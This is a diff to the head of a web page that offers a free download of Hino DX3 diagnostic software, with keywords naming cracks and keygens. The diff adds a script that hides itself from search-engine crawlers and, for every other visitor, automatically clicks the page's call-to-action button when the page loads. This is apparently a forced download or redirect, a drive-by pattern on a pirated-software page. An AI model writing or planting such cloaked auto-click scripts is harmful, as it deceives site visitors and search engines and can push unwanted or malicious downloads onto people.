@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hino DX3 Ver 1.24.4 06.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download the latest Hino DX3 Ver 1.24.4 (June 2024) diagnostic software. Offers multi-language support and extensive diagnostic features for Hino vehicles.">
     <meta name="keywords" content="Hino DX3 1.24.4 06.2024, Hino DX3 diagnostic software, Hino DX3 diagnostic software download, Hino DX3 diagnostic software free download, Hino DX3 1.24.4 download, Hino DX3 ver 1.24.4, Hino DX3 1.24.4 free download, Hino DX3 2024, Hino DX3 ver 1.24.4 2024, Hino DX3 1.24.4 crack, Hino DX3 1.24.4 keygen, Hino diagnostic software, Hino DX3 1.24.4 download free, Hino DX3 1.24.4 на русском, Hino DX3 1.24.4 скачать бесплатно, Скачать Hino DX3 1.24.4, Hino DX3 diagnostic software 2024, Hino DX3 diagnostic tool free download, Hino DX3 keygen, Хино DX3 2024 скачать, Hino DX3 v1.24.4 download, free download Hino DX3 v1.24.4, Hino DX3 интерфейс русский, Hino diagnostic software free download, download Hino DX3 diagnostic software, 2024 Hino DX3 diagnostic software">
     <style>
